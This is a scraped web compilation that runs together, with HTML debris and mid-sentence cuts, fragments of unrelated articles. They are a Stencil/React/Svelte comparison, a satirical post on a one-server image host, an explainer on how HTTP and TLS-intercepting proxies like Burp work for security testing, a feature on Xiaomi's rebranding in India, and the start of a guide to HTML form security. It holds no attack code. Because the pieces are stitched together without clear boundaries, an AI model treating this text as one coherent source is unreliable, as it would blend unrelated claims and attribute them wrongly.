Svelte - that’s another framework we’ve considered in the past and one we’re following closely today.

With Stencil both the props and state are just members of </span><span>this</span><span> - </span><span>this.newTodo</span><span> and</span><span> this.mode</span><span>l.</span></span></p><p id="viewer-6ojpl"><span><span>The second difference is the use of the </span><span>class</span><span> attribute instead of the </span><span>className</span><span> attribute. The semantics are the same, with Stencil using the more standard naming scheme.</span></span></p><p id="viewer-acdmj"><span><span>The third difference is event binding, where in Stencil they promote using arrow functions while React promotes explicit binding using the</span><span> .bind() </span><span>function. This is obviously a preference and both options can be used in both libraries.</span></span></p><p id="viewer-8hram"><span><span>The last, not so obvious, difference is with using child components. In the React version, we see the use of </span><span>TodoFooter</span><span> and </span><span>TodoItem</span><span> - both are React components which are imported into the module. However, with Stencil, the child components are</span><span> todo-footer</span><span> and</span><span> todo-item</span><span>, and there is no import statement to import those into the module. </span></span></p><p id="viewer-d0h3a"><span><span>While this may seem strange at first glance, it actually makes sense once you remember that both </span><span>todo-footer</span><span> and</span><span> todo-item</span><span> are web components and are supported natively by browsers.</span></span></p><p id="viewer-f06tp"><span><span>When comparing Stencil to React and Svelte in terms of performance, Stencil scores a higher lighthouse score for desktop. For mobile, Svelte takes the lead but is less stable. Stencil on mobile is close behind Svelte and is more stable.</span></span></p><p id="viewer-9o36j"><span><span><strong>Desktop comparison:</strong></span></span></p><div id="viewer-83opl"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/is-stencil-a-better-react" data-pin-media="https://static.wixstatic.com/media/66bc35_d9cba83a658e4417a9cc3b645d5b8618~mv2.png/v1/fit/w_1000%2Ch_320%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/66bc35_d9cba83a658e4417a9cc3b645d5b8618~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-6ong4"><span><span><strong>Mobile Comparison (3 runs):</strong></span></span></p><div id="viewer-b92bd"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.wix.engineering/post/is-stencil-a-better-react" data-pin-media="https://static.wixstatic.com/media/66bc35_b34e4ab9ba6b4111b98a2e7b44ffcd1d~mv2.png/v1/fit/w_1000%2Ch_488%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/66bc35_b34e4ab9ba6b4111b98a2e7b44ffcd1d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-9gf8n"><span><span>All the libraries score very high grades for the TodoMVC case.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
Posted on
<time itemprop="datePublished" datetime="2020-11-19">November 19, 2020</time>.
</p><div itemprop="articleBody"><p>Every day at work, hundreds of customers ask us "can I get a large cappuccino?". Later, we go home and use the money to narrowly avoid starvation while working on IMGZ, the best image host, in true Silicon Valley spirit. We thought that some of the architectural challenges we faced while building the service would interest others, and decided to write about them to help our readers and change the world.</p>
<p>If you aren't familiar with IMGZ, it's an image host with a twist: You pay to host images, thus ensuring that we always have your best interests in mind and won't turn into a social network. In essence, we flip the traditional "startup giving away VC money to users" on its head, and take money <strong>from</strong> users. If that sounds good to you, you can sign up <a href="https://imgz.org/">on our home page</a> and we'll only be mildly surprised.</p>
<p>At IMGZ, we're passionate about two things: Serving images, and speaking about ourself in the plural so it doesn't look like it's the one-man sideproject it is, and we don't even really care about serving images that much. Today, though, we're going to talk about the former, and take a deep dive into the technical details of serving more than one million bytes of images per day while maintaining the elusive "nine fives" reliability guarantee we're loved for and usually uphold.</p>
<h2>Architecture deep-dive</h2>
<p>Our architecture is pretty simple, a fairly run-of-the-mill, scrappy-startup SaaS architecture which you've no doubt seen countless times before:</p>
<p><a href="https://imgz.org/i9hxfgRu/"><img src="https://imgz.org/i9hxfgRu.png" alt="Architecture diagram"></a></p>
<p>While designing the IMGZ storage and serving model, we wanted scalability and reliability to be our foremost concerns.
After months of designs and grueling research, we ended up designing a Kafka-based georeplicated image processing pipeline over a multitenant, distributed, resilient microservices architecture, where metadata about each image is kept in a georeplicated MongoDB instance, and with images themselves stored in DynamoDB on AWS, ensuring scalability and low latency.</p>
<p>When we realized we didn't have investors to impress, we trashed that plan, as it sounded like too much work.
We realize that architecture design nowadays is mostly aspirational, but at some point a startup needs to come to terms with the fact that it doesn't have ten million users right now, it probably won't have ten million users soon, and it'll likely never have ten users.
Instead, we stored the images in a small Postgres database (yes, the actual image data itself), with a small Django app handling the business logic. Sexy.</p>
<p>When the user uploads an image, we process it, create thumbnails for displaying in various views of the website, and store it along with its metadata in the database, at least in theory.
When a user requests the image, the request first goes through our CDN, which fetches the image from our server and then caches it forever, so each image is only served by us at most once.
For our CDN (for serving, caching, georeplication, etc), we use CloudFlare's free tier, which is excellent.
We ensure that we'll always remain in the free tier by providing a paid service nobody would actually ever pay for.</p>
<h2>The hardware</h2>
<p>This is the heart of IMGZ:</p>
<p><a href="https://imgz.org/iABb4tze/"><img src="https://imgz.org/iABb4tze.jpg" alt="Servers"></a></p>
<p>Images, just like the one above, are the heart of our service, but let's not digress.
The hardware is a $5/mo Hetzner VM that serves ~10 other projects, so it's pretty beefy.
As our favorite proverb goes, "you don't need lots of resources when all your content is static and you can get someone else to serve it for free".</p>
<p>We're pretty confident in our ability to scale our infrastructure in the event that more users join the service, as our VPS provider has a button we can press to make the server larger, solving all scalability problems once and for all.</p>
<h2>Moral of the story</h2>
<p>This article was a bit boring, wasn't it? That's by design: Your architecture doesn't have to be exciting to work, especially in the early stages of a company. Doing the easiest thing that works (taking care not to paint yoursellf into a corner) is often the best way to start, since you usually don't even know where you'll end up.</p>
<p>To summarize, our architecture follows the tried-and-true Silicon Valley approach: Build the simplest thing you can, by piggybacking off of everyone's free tier, while they hope you one day become successful and pay them exorbitant amounts of money in return. The strategy to outsmarting them is simple:</p>
<p>Just make sure you never succeed.</p>

When I wanted to write a custom proxy tool (it's a simple Python script) in <a href="https://parsiya.net/blog/2015-10-19-proxying-hipchat-part-3-ssl-added-and-removed-here/" title="Proxying Hipchat Part 3: SSL Added and Removed Here" target="_blank">Hipchat part3</a>, I had to go back and learn how they work. I did not find such a resource online that looked at proxies from an infosec perspective. Most talked about how to configure caching or forwarding proxies and not much about MitM ones. I have briefly talked about it in the section 2 of the same post named <code>How does a Proxy Work?</code>. In this post I am going to take a deep(er) dive. I actually read some RFCs and they were surprisingly well written.</p><p>If you want to skip the intro, go to <a href="#section-3" title="How HTTP Proxies Work" target="_blank">section 3</a>.</p><p>That is a fair question. Most of the time, we pipe the browser to Burp and it works out of the box. However, if something small changes we will go into panic mode. What if the webapp uses a Java or Silverlight component and it has some quirky things? Another reason is for proxying thick clients because Burp as you have seen here is not just for webapps. My opinion is "<strong>if the application uses HTTP, you can Burp it</strong>." Thick clients may not work out of the box when proxied (often just redirecting their traffic to the proxy is a pain). If we do not know how proxies work internally, we cannot troubleshoot the issues.</p><p>You are now convinced that you need to read this right? <strong>riiiiiiiiiiiiight?</strong></p><p>It really helps to put ourselves in place of the proxy when reading this. At least that is what worked for me. Proxy does not know whatever happens in the system like an observer. As an observer we can just make decisions about what the proxy <em>should</em> do. Things like "the user typed google.com in their browser so the proxy must send the request to google.com." Well, how does the proxy know that? The proxy cannot magically see the browser's address bar.</p><h2 id="1-1-what-does-it-mean">1.1. What does it Mean?</h2><p>We are the proxy. The only things we see are the requests/packets that the client (e.g. browser) and the endpoint send to us. We do not know anything else. And as a proxy we must decide what to do with the requests that we receive with only our knowledge.</p><p>Now that we are hopefully in the zone, let's start.</p><p>I am going to talk about two types of proxies here.</p><ul><li>Forwarding proxies</li><li>TLS terminating proxies</li></ul><p>The descriptions are not entirely accurate or detailed but are enough for our purpose. Of course this is not an exhaustive list. There are other proxies out there but these are the ones that we are interested in. To be honest we are only interested in TLS terminating proxies.</p><h2 id="2-1-forwarding-proxies">2.1. Forwarding Proxies</h2><p>We have all seen them before. These are corporate proxies that we see and use everyday. If you are in a corporate environment, check the proxy auto-config (pac) scripts. Essentially it's a text file that tells the application where to send the traffic and re-routes the traffic based on the endpoint. Usually if the endpoint is internal, things get routed normally through the internal network otherwise (requests sent over the internet) requests are sent to a forwarding proxy. You can see some examples at <a href="https://technet.microsoft.com/en-us/library/cc985335.aspx" target="_blank">Microsoft Technet</a>. From the point of view of the application, the forwarding proxy is sitting between the internal network and the internet.</p><p>Based on the name, these proxies just forward packets and cannot look inside encrypted payloads (e.g. TLS). From the point of view of a typical forwarding proxy, an established TLS connection is just a bunch of packets with random looking TCP payloads.</p><h2 id="2-2-tls-terminating-proxies">2.2. TLS Terminating Proxies</h2><p>Burp is the prime example of this type. If you know what Burp does (and you probably do because you are reading this), you know what a TLS terminating proxy does. These are proxies that usually MitM the connections and unwrap TLS to look inside the payloads.</p><p>They could be applications like Burp or Fiddler which are usually used for (security) testing. Or could be appliances like Bluecoat or the <a href="https://live.paloaltonetworks.com/t5/Configuration-Articles/How-to-Implement-and-Test-SSL-Decryption/ta-p/59719" target="_blank">SSL decryption module</a> of Palo Alto Networks' "thing" (whatever it is named). Usually these appliances are used for deep packet inspection.</p><p>You could make Burp work like a forwarding proxy by adding all endpoints to Burp's <a href="https://parsiya.net/blog/2016-03-27-thick-client-proxying-part-1-burp-interception-and-proxy-listeners/#1-4-ssl-pass-through" title="SSL Pass Through" target="_blank">SSL Pass Through</a>. This is useful for troubleshooting connections.</p><h3 id="2-2-1-it-s-not-always-tls">2.2.1. It's not Always TLS</h3><p>True. Sometimes our proxy decrypts (or decodes) layers of non-TLS encryption (or encoding). I am classifying all of these proxies under this category because TLS has become the most common way of protecting data in transit.</p><p>Now we get to the main part. In all examples we have a browser that uses a proxy (via some proxy settings) and the browser knows that it is connected to a proxy (I will talk about this later).</p><h2 id="3-1-http-proxy">3.1. HTTP Proxy</h2><p>In this case the browser is using plain HTTP (meaning there's no TLS). Both forwarding and TLS terminating proxies work similarly in this case.</p><p>Let's assume we have typed <a href="http://www.yahoo.com/" target="_blank">http://www.yahoo.com</a> in the browser. Let's forget that we get a 302 redirect in the real world and assume yahoo.com is available over HTTP. I probably should have used example.com instead but I am lazy and don't want to create the diagrams again.</p><p>The browser establishes a TCP connection to the proxy (the famous <code>SYN-SYNACK-ACK</code>) and then sends the GET request.</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/01.png" title="What does the proxy see?" alt="What does the proxy see?">
<span>What does the proxy see?</span></span></p><p>Here's how the GET request looks like in Wireshark (we can see it in plaintext because there's no TLS).</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/02.png" title="GET request sent to the proxy" alt="GET request sent to the proxy">
<span>GET request sent to the proxy</span></span></p><p>Now, we (proxy) must decide where to send this GET request. Note that both the proxy (Burp) and the browser are on the same machine so the source and destination IP addresses in the previous picture are both <code>127.0.0.1</code>. So we cannot forward the request based on the destination IP address.</p><p>How is this GET request different from a non-proxied GET request? I disabled my browser's proxy settings and recaptured the same GET request.</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/03.png" title="GET request without using a proxy" alt="GET request without using a proxy">
<span>GET request without using a proxy</span></span></p><p>Check the highlighted parts. The request sent to proxy has the <code>absoluteURI</code>. In simple words it has the complete URI (or URL) in the GET request. The proxy uses this to discover the endpoint. This was initially discussed in RFC2616 which discusses HTTP/1.1. In <a href="https://tools.ietf.org/html/rfc2616#section-5.1.2" target="_blank">section 5.1.2. Request-URI</a>, we see:</p><blockquote><p>The absoluteURI form is REQUIRED when the request is being made to a proxy.<br>...<br>An example Request-Line would be:<br>GET <a href="http://www.w3.org/pub/WWW/TheProject.html" target="_blank">http://www.w3.org/pub/WWW/TheProject.html</a> HTTP/1.1</p></blockquote><p>In newer RFCs you can look it up using <code>absolute-URI</code>. This format is called <code>absolute-form</code>. In <a href="https://tools.ietf.org/html/rfc7230" target="_blank">RFC7230 - HTTP/1.1: Message Syntax and Routing</a> we can check <a href="https://tools.ietf.org/html/rfc7230#section-5.3.2" target="_blank">section 5.3.2. absolute-form</a> to see:</p><blockquote><p>When making a request to a proxy, other than a CONNECT or server-wide OPTIONS request (as detailed below), a client MUST send the target URI in absolute-form as the request-target.</p><p>absolute-form = absolute-URI</p></blockquote><p>Note that the RFC instructs clients to send the <code>absolute-URI</code> no matter what (even if they are using a <code>CONNEC</code> request) as we will see shortly.</p><p>The proxy uses this <code>absolute-URI</code> to forward the request to the endpoint (in this case Yahoo!). Both forwarding and TLS terminating proxies work similarly in this case because they both can look inside HTTP payloads.</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/04.png" title="HTTP proxy in action" alt="HTTP proxy in action">
<span>HTTP proxy in action</span></span></p><ol><li>Browser establishes a TCP connection to proxy.</li><li>Browser sends the HTTP request (with an absolute-URI) to proxy.</li><li>Proxy establishes a TCP connection to yahoo.com (using the absolute-URI).</li><li>Proxy forwards the HTTP request.</li><li>Proxy receives the response.</li><li>Proxy closes the connection to yahoo.com.</li><li>Proxy forwards the response to browser.</li><li>Proxy signals to close the connection (using FIN).</li><li>Connection between browser and Proxy is closed.</li></ol><p>If you have done at least a bit of HTTP security testing (or have seen some HTTP requests), you are probably asking "why not just use the Host header?" That is a very good question and it was mine too. We are the proxy and we see the <code>Host</code> header, why do we need to use the absolute-URI instead?</p><p>The answer is backward compatibility with HTTP/1.0 proxies. This is hinted in <a href="https://tools.ietf.org/html/rfc7230#section-5.4" target="_blank">section 5.4. Host</a> of RFC7230:</p><blockquote><p>A client MUST send a Host header field in an HTTP/1.1 request even if the request-target is in the absolute-form, since this allows the Host information to be forwarded through ancient HTTP/1.0 proxies that might not have implemented Host.</p></blockquote><p>Later it instructs proxies to rely on the absolute-URI and ignore the <code>Host</code> header. If the <code>Host</code> header is different from the URI, then the proxy must generate the correct header and send it with the request.</p><h2 id="3-2-forwarding-proxy-and-https">3.2. Forwarding Proxy and HTTPs</h2><p>But what about HTTP(s) forwarding proxies? How do they work?</p><p>Again let's put ourselves in place of the forwarding proxy. We do not do TLS handshakes and just forward things around. After the user types <a href="https://www.google.com/" target="_blank">https://www.google.com</a> in their browser, it creates a TCP connection to us and then starts the TLS handshake. The first step of a TLS handshake is <code>ClientHello</code> discussed in <a href="https://tools.ietf.org/html/rfc5246#section-7.4.1.2" target="_blank">RFC5246 section 7.4.1.2.</a> (<a href="https://tools.ietf.org/html/rfc5246" target="_blank">RFC5246</a> is essentially TLS 1.2).</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/05.png" title="ClientHello sent from browser to proxy" alt="ClientHello sent from browser to proxy">
<span>ClientHello sent from browser to proxy</span></span></p><p>Now I did not read the TLS 1.2 RFC completely and I doubt you need to either. As the proxy, we will see a <code>ClientHello</code> like this:</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/06.png" title="ClientHello as seen by proxy" alt="ClientHello as seen by proxy">
<span>ClientHello as seen by proxy</span></span></p><p>But we are a proxy and we should know what it means. Tools should be able to do this for us. In this case I used Netmon and it decodes the <code>ClientHello</code> like this:</p><p><span><img src="https://parsiya.net/images/2016/thickclient-6/07.png" title="ClientHello deciphered" alt="ClientHello deciphered">
<span>ClientHello deciphered</span></span></p><p>Now, we need to decide where to send this <code>ClientHello</code>. How can we discover the endpoint with this information?</p><p>Well, the answer is <strong>we can't</strong>.</p><h3 id="3-2-1-the-connect-request">3.2.1. The CONNECT Request</h3><p>In simple words, the browser needs to tell the proxy where to forward the requests and this should happen before the TLS handshake (and obviously after the TCP connection is established). That's where the <code>CONNECT</code> method …</p></div></div>

<p><span>T</span>he Indiranagar 100-Feet Road is the commercial heart of India’s technology capital Bangalore, lined with international brand stores, bars, restaurants, and food courts. Owning retail space here, alongside consumer giant Reliance Digital and German footwear brand Puma, is a marker of success for brands breaking into mainstream consciousness. Chinese smartphone maker Xiaomi’s two-story, 6,000-square-foot flagship store is right at the heart of the district. Behind its saffron frontage is a showcase for its as-yet-unlaunched handsets, televisions, laptops, fitness bands, e-scooters, and water purifiers.&nbsp;</p>



<p>In June, the store had a complete facelift. A new logo was put on the front of the building that read: “Made In India.” By August, the interior had been decorated with tricolored balloons in the green, white, and orange of the Indian flag. Along the walls, a company timeline showed the history of Xiaomi’s manufacturing operations in India. Mentions of the company’s heritage — it was founded in Beijing in 2010 — disappeared. <a href="https://www.indiatoday.in/india/story/xiaomi-puts-up-made-in-india-banner-outside-stores-to-counter-boycott-china-campaign-1692633-2020-06-25">Hundreds</a> of the company’s stores across the country underwent the same transformation. “Super proud to share that majority of our TVs are #MadeInIndia! We employ thousands of team members across our India factories #ProudIndian,” <a href="https://twitter.com/manukumarjain/status/1276052185638252544?s=20">tweeted</a> Manu Kumar Jain, the India head of Xiaomi.&nbsp;</p>



<p>Anti-China sentiment had already been rising in India’s heartlands before a skirmish in June in a disputed Himalayan border region left 20 Indian soldiers dead. Nationalists started <a href="https://www.thequint.com/news/india/bharat-mata-and-chinese-tvs-a-tale-of-boycotting-goods-from-china">smashing</a> Chinese-made televisions; one minister called for shutting down <a href="https://economictimes.indiatimes.com/news/politics-and-nation/restaurants-and-hotels-that-sell-chinese-food-should-be-shut-down-union-minister-ramdas-athawale/videoshow/76442910.cms">Chinese restaurants</a>. A few weeks after the skirmish, the Indian government banned TikTok, along with hundreds of Chinese apps, and, in August, passed an <a href="https://www.ft.com/content/55642551-f6e8-4f9d-b5ba-a12d2fc26ef9">unofficial</a> order to phase out dependence on Chinese telecom equipment, including 5G networks. Prime Minister Narendra Modi made a special appearance on television encouraging Indians to be <a href="https://www.youtube.com/watch?v=0xmx92Q_kQ4">“vocal” in their support for “local” products</a>, creating the #vocalforlocal slogan.&nbsp;</p>



<p>Chinese smartphone makers like Oppo, Vivo, and Xiaomi — who made up 81% of the Indian market — were left in a precarious position after the clash. Right-wing groups gathered outside Oppo’s factory in the outskirts of Delhi and <a href="https://www.newindianexpress.com/nation/2020/jun/20/anti-china-demonstration-held-outside-oppo-factory-in-greater-noida-32-protesters-booked-2159224.html">burnt effigies of Xi Jinping</a>, as they demanded that the plant be closed. Some companies battened down the hatches, <a href="https://economictimes.indiatimes.com/industry/cons-products/electronics/chinese-brands-endorsers-may-go-slow-on-promotions-some-pull-out-ads-some-plan-to-play-up-make-in-india-credentials/articleshow/76429828.cms?from=mdr">suspending their prime-time advertising campaigns</a>. Vivo <a href="https://sports.ndtv.com/cricket/ipl-title-sponsor-vivo-pulls-out-of-tournament-this-year-amid-row-2274036">pulled out</a> as the title sponsor of the country’s biggest sporting event, the Indian Premier League cricket competition, after an aggressive campaign against it on social media. Stray protests took place outside some Xiaomi stores, as threats of vandalism loomed large and mobile shipments from China were <a href="https://telecom.economictimes.indiatimes.com/news/smartphone-makers-in-panic-mode-over-stranded-shipments/76536342">stalled for manual inspection at Indian ports</a>.</p>



<p>But while other Chinese brands retreated from the limelight, Xiaomi pursued a unique — and potentially high-risk — strategy: It presented itself as not being Chinese after all, but Indian. Jain, its figurehead in India, took to television, newspapers, and social media to talk up the company’s all-Indian local leadership team and the thousands of jobs it had created in manufacturing and retail. “We are more Indian than anyone else,” Jain told <a href="https://twitter.com/manukumarjain/status/1274316181235568645?lang=en">CNBC-TV18</a>. The company even donated money to the families of soldiers “<a href="https://www.mi.com/in/service/support/crpffund.html">martyred</a>” in Kashmir.</p>



<p>Jain has proven adept in using social media and his own personal brand to launder Xiaomi’s origins. But the company faces growing pressure in an unstable political environment. Narendra Modi’s government is once again proclaiming its desire to bring manufacturing back to India, offering <a href="https://www.bloomberg.com/news/articles/2020-09-10/india-mulls-23-billion-package-to-lure-global-manufacturers?sref=QYWxDQ1o">lavish incentives</a> for export-led manufacturers, which may help once-moribund local phone brands. Xiaomi has indeed moved some of its production onshore, but the core components of its devices are still made in China. With the country’s nationalist surge unlikely to end soon, Jain and Xiaomi will eventually have to face up to the question: How Indian is Indian enough?</p>

<p><strong>Jain, 39, “is</strong> the Indian middle-class dream personified,” in the words of a former colleague. As a child, he lived in Meerut in northern India, alongside 150 members of his extended family, in an isolated housing compound inside a military quarters built by his great grandfather. “I had never even been exposed to the outside world,” Jain says.</p>



<p>After studying at the prestigious Indian Institute of Technology and at the Indian Institute of Management business school, he joined the global consulting firm McKinsey.</p>



<p>Jain’s early career in technology was successful but low profile. He quit McKinsey in 2012 to launch e-commerce portal Jabong.com, which was sold to SoftBank-backed (now Walmart-owned) rival Flipkart for $70 million in 2016. By then, Jain had already moved on to <a href="https://www.thehindubusinessline.com/companies/Jabong%E2%80%99s-former-MD-switches-attention-to-wearable-smart-devices/article20718785.ece#">start a short-lived wearables company</a>. In 2014, he became Xiaomi India’s first hire, recruited by Hugo Barra, the former Android executive who had been tasked with expanding Xiaomi outside China.</p>



<p>At the time, the market was dominated by Samsung and by Indian brands, such as Micromax, Karbonn, and Lava, whose model was to import unbranded Chinese products and sell them as their own. “There was no R&amp;D team, no product team, and no product design. They would basically just buy those products and sell them here,” says Jain.</p>



<p>Xiaomi’s entry was not just about cutting out the middleman. In China, Xiaomi, along with Oppo and Vivo, had evolved beyond their origins in cheap but unreliable products and were now designing and producing higher-quality but affordable devices that were well adapted to a market like India, where disposable income was increasing in step with demand for mobile data.</p>



<p>Jain began his tenure at Xiaomi with a big gamble. In 2014, only 6% of Indian retail sales happened through e-commerce, but Jain launched Xiaomi as an online-only brand, replicating an approach that had worked in China.&nbsp;</p>

<p>“Most people said, You are going to fail. You are going to be a disaster,” he said during a 2017 TED Talk. “Most smartphone brands until then focused on building large distribution networks, and we didn’t do that.”&nbsp;</p>



<p>To drum up interest, the company organized flash sales and made sure the phones sold out quickly, to enhance their perceived popularity, a technique known as “hunger marketing.” They spent relatively little on advertising, instead relying on their users to become evangelists for the brand.</p>



<p>Xiaomi’s phones seemed to hit a sweet spot of pricing and specifications. “Their phones were undercutting basically every other device on the market by half,” says Harish Jonalaggada, Asia editor at mobile review portal Android Central. The company launched phones for $180, with high specs like 64GB storage and 4GB RAM that were previously seen on only devices over $400.</p>



<p>The rush of orders for the launch of the Mi 3 model crashed the Indian e-commerce website Flipkart in the summer of 2014.&nbsp;</p>



<p>But Xiaomi’s success wasn’t just about its hardware. Under Jain’s leadership, the company tailored its Android-based operating system, MIUI, to the local market. One feature, Smart SMS, identifies the cluttered text messages that Indian Railways sends to its customers and extracts booking information, turning it into a ticket-like document. Xiaomi was the first company in India to incorporate a popular “dual app” feature that allows users to run duplicate versions of the same app — such as WhatsApp — on the same phone.</p>



<p>As online channels exploded in popularity and started to become saturated, Xiaomi shifted direction. In 2017, the company dramatically expanded its physical retail presence, pushing deep into rural areas. In October 2018, it set a mark recognized by the Guinness World Records by opening <a href="https://gadgets.ndtv.com/mobiles/news/xiaomi-opens-over-500-retail-stores-in-a-single-day-in-rural-india-1950375">500 stores</a> in a day. “One of the reasons Xiaomi has done well is — from both a product perspective and channel perspective — they made decisions unique to the India market,” says a Shanghai-based financial analyst covering Xiaomi who requested to remain anonymous, citing geopolitical tensions. In September, Xiaomi piloted its unique <a href="https://gadgets.ndtv.com/mobiles/news/xiaomi-mi-store-on-wheels-mobile-stores-moving-trucks-launch-india-villages-watch-xiaomi-2298745">Mi Store on Wheels</a>, a van that sells everything from trimmers to phones throughout the hinterlands of India.&nbsp;</p>



<p>This sensitivity to the local market is in no small part due to the unusual autonomy that Jain has had in running Xiaomi in India. The Indian operations of Oppo and Vivo are both run by Chinese nationals. “Chinese companies are often very inward-looking and wouldn’t devolve the power in the same way Xiaomi has,” the analyst says.</p>

<p>That unusual autonomy stems from the relationship that Jain has built with Lei Jun, Xiaomi’s founder and CEO, a self-confessed acolyte of Apple founder Steve Jobs. Jain says that, when he and Jun first met, “both of us were wearing black T-shirts and denim jeans. It was cool.”</p>



<p>One former employee, who worked closely with Jain while setting up the India operations, told <em>Rest of World</em>: “Over a period of time when Xiaomi India was growing, Manu was able to earn Jun’s trust, which is actually very hard. … Manu’s bets on the Indian market proved him right. And so, after a while, the CEO decided to just let Manu make his own decisions, which is very rare.”&nbsp;</p>



<p>By 2019, Xiaomi was the largest smartphone brand in India, shifting 100 million units, according to data from the International Data Corporation. The company has expanded beyond mobile and offers everything from luggage to beard trimmers. Its rise came at the cost of Indian brands, whose market share fell from close to 50% to just 13% by the end of 2018, according to market intelligence firm Counterpoint Research.&nbsp;</p>



<p>Jun and Jain share a love of the limelight. Jun is a <a href="https://www.nytimes.com/2013/06/05/business/global/in-china-an-empire-built-by-aping-apple.html">social media celebrity</a> in China, posting mobile teasers and specifications to his 5 million …</p></div></div>

Each article can be read independently, but I wrote them in the order that makes the most sense. If you have not read the others, I would encourage you to take a look.</p> <ul><li><a href="https://austingil.com/how-to-build-html-forms-right-semantics/">Part 1: Semantics</a></li><li><a href="https://austingil.com/how-to-build-html-forms-right-accessibility/">Part 2: Accessibility</a></li><li><a href="https://austingil.com/build-html-forms-right-styling/">Part 3: Styling</a></li><li><a href="https://austingil.com/build-html-forms-right-user-experience/">Part 4: User Experience</a></li><li><strong>Part 5: Security</strong></li></ul> <p>This final article in the series is arguably the most important. It covers security. While the other articles were mainly focused on the frontend, security goes beyond that. We have to consider the current user, other users, and our own security. As such, we will look at the whole application architecture from frontend to backend and beyond.</p>  <h2><span id="Encrypt_Traffic_(SSL)"></span>Encrypt Traffic (SSL)<span></span></h2> <p>Before we get too far, I will be using the term “SSL” to refer to a technology used to encrypt traffic on the internet. Technically, I mean Transport Layer Security (TLS), but “SSL” is commonly used and understood to mean the same thing. It’s what gives websites the little green lock in the URL bar and why they start with “http<strong>s</strong>” instead of “http” (no “s”). </p> <p>Installing an SSL certificate is a best practice for several reason, security being the most important. Having an SSL certificate lets you encrypt the data passed between the client (your user) and the server (you). </p> <p>A hacker snooping on a network may inspect the packets of data a user sends. Without an SSL certificate, that data may be easily read as plain text. With an SSL certificate, the data can still be intercepted, but it would be sent as encrypted text which is pretty much useless.</p> <ul><li>Without an SSL certificate: username: <br><code>NuggetTheMighty; password: ILoveSquirrels</code></li><li>With an SSL certificate (encrypted): <br><code>SIUFJaYQNtsn+y73mfBYv3fVfjJ2GdHl4A7XnTJXxgUyd4/TrU3nN+g3aJ4BVXSJL/E7</code></li></ul> <p>This is especially important when creating forms because the whole point of a form is to send data. We owe it to our users to protect their data.</p> <p>Getting and installing an SSL certificate used to cost time, money, and some technical know-how. Today, many hosting services will provide and install a certificate for you for free. In many cases, they even do so automatically.</p> <p>If your hosting service does not provide SSL certificates, there are other options:</p> <ul><li><a href="https://www.cloudflare.com/" rel="noopener">Cloudflare</a> provides a “flexible” SSL through their DNS. It’s free and easy, but probably better to have your own.</li><li>If your site uses <a href="https://wordpress.org/" rel="noopener">WordPress</a>, there are a few <a href="https://wordpress.org/plugins/ssl-zen/" rel="noopener">plugins</a> that will set up a certificate in under a minute, via <a href="https://letsencrypt.org/" rel="noopener">Let’s Encrypt</a>.</li><li>You can use <a href="https://certbot.eff.org/" rel="noopener">Certbot</a> to generate and install a certificate for you via <a href="https://letsencrypt.org/" rel="noopener">Let’s Encrypt</a>.</li></ul> <p>If you still don’t have an SSL certificate because your host doesn’t provide one, and you don’t have control of the DNS or server code…well, you’re kind of out of luck. You’re going to have to switch hosts, or talk to your server admin, or do something because this should be a hard requirement for any project these days.</p> <h2><span id="Understand_GET_vs_POST"></span>Understand GET vs. POST<span></span></h2> <p>In <a href="https://austingil.com/how-to-build-html-forms-right-semantics/">a previous article</a>, I said you should always include the <code>method</code> attribute on your forms. The <code>method</code> attribute tells the form to submit data with the <code>GET</code> or <code>POST</code> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" rel="noopener">HTTP header</a> on the request. If you omit the <code>method</code>, the browser will default to using the <code>GET</code> method. This is important because there are significant differences between <code>GET</code> and <code>POST</code> requests.</p> <h3><span id="GET_Request"></span>GET Request<span></span></h3> <p>Take a look at the following form using a GET method. When you submit the form, the data will be submitted to example.com (spoiler alert, it doesn’t actually do anything).</p> <div data-prefill="" data-default-tab="html,result"> <pre data-lang="html">&lt;form action="https://example.com" method="GET" target="_blank"&gt;
  &lt;label for="data"&gt;Send some sweet data&lt;/label&gt;
  &lt;input id="data" name="some-sweet-data"/&gt;
  &lt;button&gt;Submit&lt;/button&gt;
&lt;/form&gt;</pre> </div> <p>The key thing to notice is the URL after you submit the form. Although the form’s <code>action</code> is “example.com”, the submission URL is “example.com?<strong>some-sweet-data</strong>=blahblahblah”. Those query parameters correspond to the form inputs name attributes. This is how forms using the <code>GET</code> method transfer data; query string parameters.</p> <p>Passing data as a URL parameter is relevant to security for a couple of reasons:</p> <ol><li>For many users, URL’s get saved in the browser’s history. Consider if form was sending a credit card number by query parameter, and the user was on a public computer, like at a library. Their private data could end up in the browser’s history for the next user to see.</li><li>Many servers keep logs of the URL’s that received traffic. If sensitive information ends up in server log files, anyone with access to those files could see the data.</li></ol> <h3><span id="POST_Request"></span>POST Request<span></span></h3> <p>Fortunately, you can use the <code>POST</code> method to send data without using query parameters. Let’s look at the same form, but using the <code>POST</code> method:</p> <div data-prefill="" data-default-tab="html,result"> <pre data-lang="html">&lt;form action="https://example.com" method="POST" target="_blank"&gt;
  &lt;label for="data"&gt;Send some sweet data&lt;/label&gt;
  &lt;input id="data" name="some-sweet-data"/&gt;
  &lt;button&gt;Submit&lt;/button&gt;
